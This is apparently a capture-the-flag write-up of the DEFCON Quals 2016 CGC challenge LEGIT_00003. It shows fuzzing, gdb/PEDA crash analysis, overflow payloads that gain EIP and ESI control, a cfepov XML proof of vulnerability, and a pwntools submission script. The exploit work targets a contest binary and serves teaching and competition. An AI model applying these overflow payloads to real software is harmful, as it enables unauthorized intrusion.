# DEFCON QUALS 2016 – LEGIT_0003 – CGC POV PRIMER CHALLENGE

Defcon Quals 2016 were held over the weekend, while I didn’t qualify for the finals (any teams wanting a stand in ? Let me know :D :D ) I did become intrigued by the CGC challenges that were presented. Today I’m writing up the solution to LEGIT_0003. The most basic of the CGC challenge binaries (CB). I’m going to write it from a complete dummies perspective because that’s what I was (AM).

Firstly, nothing here is a substitute for the documentation. I recommend these places to read up on this topic and as reference when you get stuck:

- CGC Docs
- CGC Sample challenge binaries/sample POVs
- CGC cfepov PoV markup spec

So without diving too much into the background, finding a vulnerability in a CGC CB requires that you prove it by building a “PoV” (Proof of Vulnerability) file. The PoV file is a XML document that describes how to exploit the vulnerability you found in a deterministic repeatable way that is machine verifiable. It proves the team who found the vulnerability deeply understands the vulnerability. The PoV file format used in Defcon was the cfepov format compiled into a binary file by following a few simple (but honestly, frustrating when you’ve never done it before) steps.

Let’s look at the vulnerability first them move on to providing a PoV.

As we saw in my last writeup we can analyse the binary in standard tools within Decree or we can use cgc2elf and use tools like IDA Pro. Firstly though it’s good to just run the file and fuzz a few things because at this entry level you might stumble upon the fault. We run the binary in the crs:

```
vagrant@crs:~/LEGIT_00003$ ./legit_00003 
1) Gimme Name
2) Print Name
3) Exit
: 1
Enter Name: Kris
1) Gimme Name
2) Print Name
3) Exit
: 2
Kris
1) Gimme Name
2) Print Name
3) Exit
: 1
Enter Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```

Ok fine so a simple program, only one input, and it crashes. Nice – let’s check in gdb (don’t forget, you can easily install PEDA inside your crs).

```

vagrant@crs:~/LEGIT_00003$ gdb -q ./legit_00003 
Reading symbols from ./legit_00003...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/vagrant/LEGIT_00003/legit_00003 
1) Gimme Name
2) Print Name
3) Exit
: 1
Enter Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0x41414141 ('AAAA')
EDX: 0x41414141 ('AAAA')
ESI: 0xbaaaaf0c ('A' <repeats 46="" times="">, "\004\b\202\257\252\272\002")
EDI: 0x0 
EBP: 0xbaaaaed4 --> 0xbaaaaf34 ("AAAAAA\004\b\202\257\252\272\002")
ESP: 0xbaaaaec4 --> 0x0 
EIP: 0x8048201 (mov    BYTE PTR [ecx+eax*1],dl)
EFLAGS: 0x10297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80481f8:  mov    dl,BYTE PTR [ecx+eax*1]
   0x80481fb:  mov    eax,DWORD PTR [ebp-0x10]
   0x80481fe:  mov    ecx,DWORD PTR [ebp-0x4]
=> 0x8048201:  mov    BYTE PTR [ecx+eax*1],dl
   0x8048204:  mov    eax,DWORD PTR [ebp-0x10]
   0x8048207:  add    eax,0x1
   0x804820c:  mov    DWORD PTR [ebp-0x10],eax
   0x804820f:  jmp    0x80481e6
[------------------------------------stack-------------------------------------]
0000| 0xbaaaaec4 --> 0x0 
0004| 0xbaaaaec8 --> 0x2e ('.')
0008| 0xbaaaaecc --> 0xbaaaaf0c ('A' <repeats 46="" times="">, "\004\b\202\257\252\272\002")
0012| 0xbaaaaed0 ("AAAA4\257\252\272\060\203\004\bAAAA\f\257\252\272.")
0016| 0xbaaaaed4 --> 0xbaaaaf34 ("AAAAAA\004\b\202\257\252\272\002")
0020| 0xbaaaaed8 --> 0x8048330 (add    esp,0x54)
0024| 0xbaaaaedc ("AAAA\f\257\252\272.")
0028| 0xbaaaaee0 --> 0xbaaaaf0c ('A' <repeats 46="" times="">, "\004\b\202\257\252\272\002")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x08048201 in ?? ()
gdb-peda$ 
```

Ok no EIP control on our first attempt. No big deal but EIP control is mandatory for a Type1 proof of vulnerability so we need that. We crashed on an attempt to load memory at an address of ECX+EAX*1. We can see our ECX register is set to “0x41414141” so we can say we can control ECX. EAX is 0x00 at the time of the crash so if we insert a valid address into ECX we will make it past this crash onto greener pastures? Who can say. Let’s try it!

I use PEDA’s pattern create to find our crash offset:

```
gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /home/vagrant/LEGIT_00003/legit_00003 
1) Gimme Name
2) Print Name
3) Exit
: 1
Enter Name: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
Program received signal SIGSEGV, Segmentation fault.
----------------------------------registers-----------------------------------]
EAX: 0x0 
ECX: 0x41412941 ('A)AA')
EIP: 0x8048201 (mov    BYTE PTR [ecx+eax*1],dl)
[-------------------------------------code-------------------------------------]
=> 0x8048201:  mov    BYTE PTR [ecx+eax*1],dl
[------------------------------------stack-------------------------------------]
0012| 0xbaaaaed0 ("A)AA4\257\252\272\060\203\004\bA)AA\f\257\252\272\060")
[------------------------------------------------------------------------------]
Stopped reason: SIGSEGV
0x08048201 in ?? ()
gdb-peda$ pattern_offset 0x41412941
1094789441 found at offset: 32
```

What address to give this instruction? Does it matter? Maybe maybe not. I choose 0xbaaaaed0, a stack address, not for any reason really. I just thought I’d try that in a hurry and we can see it was kind enough to work:

```
vagrant@crs:~/LEGIT_00003$ uname -a
Linux crs 3.13.11-ckt21-cgc #1 SMP Mon Feb 29 16:42:11 UTC 2016 i686 GNU/Linux
vagrant@crs:~/LEGIT_00003$ python -c 'print "1\n"+"A"*32+"\xd0\xae\xaa\xba"+"B"*20'
1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAЮ��BBBBBBBBBBBBBBBBBBBB
vagrant@crs:~/LEGIT_00003$ python -c 'print "1\n"+"A"*32+"\xd0\xae\xaa\xba"+"B"*20' > badstr.txt 
vagrant@crs:~/LEGIT_00003$ gdb -q ./legit_00003 
Reading symbols from ./legit_00003...(no debugging symbols found)...done.
gdb-peda$ r < badstr.txt 
Starting program: /home/vagrant/LEGIT_00003/legit_00003 < badstr.txt
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x30 ('0')
EBX: 0x0 
ECX: 0xbaaaae41 --> 0x41414100 ('')
EDX: 0xbaaaae42 ('A' <repeats 31="" times="">, "Ю\252\272", 'B' <repeats 12="" times="">)
ESI: 0x42424242 ('BBBB')
EBP: 0x42424242 ('BBBB')
ESP: 0xbaaaaf3c --> 0xbaaaaf82 --> 0x0 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbaaaaf3c --> 0xbaaaaf82 --> 0x0 
0004| 0xbaaaaf40 --> 0x2 
0008| 0xbaaaaf44 --> 0xa ('\n')
0012| 0xbaaaaf48 --> 0x0 
0016| 0xbaaaaf4c --> 0x0 
0020| 0xbaaaaf50 --> 0x0 
0024| 0xbaaaaf54 --> 0x0 
0028| 0xbaaaaf58 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

Ok so we know what will give us EIP control and to be a valid PoV we also must demonstrate control of at least one other register from this list:

eax
ecx
edx
ebx
esp
ebp
esi
edi
Additional to just “control” of that register, it must have data independent to the EIP. So if somehow we overwrote both EIP and another register’s contents with the same 32 bits, well we need to try harder. In our case everything is 0x42424242 so we need to refine a little bit to check.

```
vagrant@crs:~/LEGIT_00003$ uname -a
Linux crs 3.13.11-ckt21-cgc #1 SMP Mon Feb 29 16:42:11 UTC 2016 i686 GNU/Linux
vagrant@crs:~/LEGIT_00003$ python -c 'print "1\n"+"A"*32+"\xd0\xae\xaa\xba"+"B"*4+"C"*4+"D"*4+"E"*10'
1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAЮ��BBBBCCCCDDDDEEEEEEEEEE
vagrant@crs:~/LEGIT_00003$ python -c 'print "1\n"+"A"*32+"\xd0\xae\xaa\xba"+"B"*4+"C"*4+"D"*4+"E"*10' > badstr.txtvagrant@crs:~/LEGIT_00003$ gdb -q ./legit_00003 
Reading symbols from ./legit_00003...(no debugging symbols found)...done.
gdb-peda$ r < badstr.txt 
Starting program: /home/vagrant/LEGIT_00003/legit_00003 < badstr.txt
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x30 ('0')
EBX: 0x0 
ECX: 0xbaaaae41 --> 0x41414100 ('')
EDX: 0xbaaaae44 ('A' <repeats 29="" times="">, "Ю\252\272BBBBCCCCDDDD")
ESI: 0x42424242 ('BBBB')
EDI: 0x0 
EBP: 0x43434343 ('CCCC')
ESP: 0xbaaaaf3c --> 0xbaaaaf82 --> 0x0 
EIP: 0x44444444 ('DDDD')
EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x44444444
[------------------------------------stack-------------------------------------]
0000| 0xbaaaaf3c --> 0xbaaaaf82 --> 0x0 
0004| 0xbaaaaf40 --> 0x2 
0008| 0xbaaaaf44 --> 0xa ('\n')
0012| 0xbaaaaf48 --> 0x0 
0016| 0xbaaaaf4c --> 0x0 
0020| 0xbaaaaf50 --> 0x0 
0024| 0xbaaaaf54 --> 0x0 
0028| 0xbaaaaf58 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x44444444 in ?? ()
```

Ok so we now know exactly where we control EIP, and ESI and each is independant from the other. So we have the basis of our proof. Now to writing the PoV.

Starting with an example is always handy, however “cfepov” format examples demonstrating Type1 vulnerabilities are pretty hard to come by. I ended up starting with this template:

```
<?xml version="1.0" standalone="no" ?>
<!DOCTYPE cfepov SYSTEM "/usr/share/cgc-docs/cfe-pov.dtd">
<cfepov>
<cbid>service</cbid>
<replay>
    <negotiate><type1><ipmask>0x3f3f3f3f</ipmask><regmask>0x3f3f3f3f</regmask><regnum>6</regnum></type1></negotiate>
    <read><length>68</length></read>
</replay>
</cfepov>
```

It needs a lot of work though but its a start. From the top we read down. We can skip past the header and the cbid value. These are required but for Defcon “service” worked here.

Onto the “negotiate” phase. This is where your PoV negotiates with the challenge server on the terms of what you intend to prove and any parameters that you need for example, an “ipmask” and a “regmask”. These are bit masks that may need to be applied if you don’t have perfect EIP/register control (I guess?). We don’t need a bitmask so we need to change those both to: 0xffffffff. Next we specify the register we know we can control using the list found here. In my case it was ESI, “regnum = 6.

Our PoV so far:

```
<?xml version="1.0" standalone="no" ?>
<!DOCTYPE cfepov SYSTEM "/usr/share/cgc-docs/cfe-pov.dtd">
<cfepov>
<cbid>service</cbid>
<replay>
    <negotiate><type1><ipmask>0xffffffff</ipmask><regmask>0xffffffff</regmask><regnum>6</regnum></type1></negotiate>
```

Moving forward we see our “read” section. In this section we get to specify our communications with the binary on stdin/stdout in both reads and writes. This specifies for example, what steps the machine verification needs to follow to get to the vulnerable code.

The first parts pretty easy, we do these steps:

- We “read” 38 bytes of the menu data
- len(“1) Gimme Name\n2) Print Name\n3) Exit\n: “) = 38 bytes
- Then we write “1\n” to get to the Name entering code
- Then we send our long string

The way we specify this is:

```
    <read echo="yes"><length>38</length></read>
    <write><data>1\x0a</data></write>
    <read echo="yes"><length>12</length></read>
    <write><data>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xae\xaa\xba</data>
           <var>TYPE1_REG</var>
           <data>BBBB</data>
           <var>TYPE1_IP</var>
           <data>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x0a</data></write>
```

A bit of explanation here. Remember when we mentioned we’re “negotiating” with the challenge framework? Well part of that is that the machine tells us what it wants us to set EIP and our register to. This is unique every run. So we specify that with the two special data sections called “var” and the special var names “TYPE1_IP” and TYPE1_REG”.

Our entire PoV looks like this:

```
<?xml version="1.0" standalone="no" ?>
<!DOCTYPE cfepov SYSTEM "/usr/share/cgc-docs/cfe-pov.dtd">
<cfepov>
<cbid>service</cbid>
<replay>
    <negotiate><type1><ipmask>0xffffffff</ipmask><regmask>0xffffffff</regmask><regnum>6</regnum></type1></negotiate>
    <read echo="yes"><length>38</length></read>
    <write><data>1\x0a</data></write>
    <read echo="yes"><length>12</length></read>
    <write><data>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xae\xaa\xba</data>
           <var>TYPE1_REG</var>
           <data>BBBB</data>
           <var>TYPE1_IP</var>
           <data>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x0a</data></write>
</replay>
</cfepov>

```

Ok great!!! Now can we submit it and collect internet points?!?!

NOPE!

PoV’s can’t be submitted to Defcon’s framework as XML files. We must compile them to binary PoVs. To do this we use a few tools. The first is called pov-xml2c. This tool uses the cfe-pov DTD to convert your XML document into a C source code that leverages libpov and libcgc to conduct the repeatable attack.

So you need these:

pov-xml2c
libpov
libcgc – comes with your crs vagrant VM probably
cfe-pov.dtd
I built pov-xml2c on my Kali box but I don’t think it matters where you build it. You use it like this:

```
vagrant@crs:/vagrant/defcon/legit_00003$ uname -a
Linux crs 3.13.11-ckt21-cgc #1 SMP Mon Feb 29 16:42:11 UTC 2016 i686 GNU/Linux
vagrant@crs:/vagrant/defcon/legit_00003$ pov-xml2c -x legit_00003_pov.xml -o mypov.c
```

You can check out the pov source code in C but I don’t think you really need to. Next you need to compile your source code. You must do this using the CGC toolchain. Meaning clang compiler specifically built to emit CGC binaries. I did it like this.

```
vagrant@crs:/vagrant/defcon/legit_00003$  /usr/i386-linux-cgc/bin/clang -c -nostdlib -fno-builtin -nostdinc -Iinclude -Ilib -I/usr/include -O0 -g -Werror -Wno-overlength-strings -Wno-packed -DCGC_BIN_COUNT=0 -o mypov.o mypov.c
```

That gives us a object file that we must link against libpov and libcgc. We link it like this:

```
vagrant@crs:/vagrant/defcon/legit_00003$ /usr/i386-linux-cgc/bin/ld -nostdlib -static -o mypov mypov.o -L/usr/lib -lpov -lcgc -mcgc_i386
vagrant@crs:/vagrant/defcon/legit_00003$ ls -la mypov
-rwxr-xr-x 1 vagrant vagrant 186045 May 23 12:20 mypov
vagrant@crs:/vagrant/defcon/legit_00003$ file mypov
mypov: CGC 32-bit LSB executable, (CGC/Linux)
vagrant@crs:/vagrant/defcon/legit_00003$ 
```

Now can we submit it? Sure! Give it a whirl! I used the following submitter to submit to Defcon’s server:

```
#!/usr/bin/python
from pwn import *
host = 'legit_00003_25e9ac445b159a3d5cf1d52aea007100.quals.shallweplayaga.me'
port = 32648
pov = 'mypov'
povbin = open(pov,'rb').read()
povlen = str(len(povbin))
conn = remote(host,port)
povlenq = conn.recvline()
print "[*] Sending length:",povlen
conn.sendline(povlen)
sendreq = conn.recvline()
print "[*] Sending pov:"
conn.sendline(povbin)
conn.interactive()
```

Hope this helps some people get to the next level challenges that are a little more challenging in CGC next time!
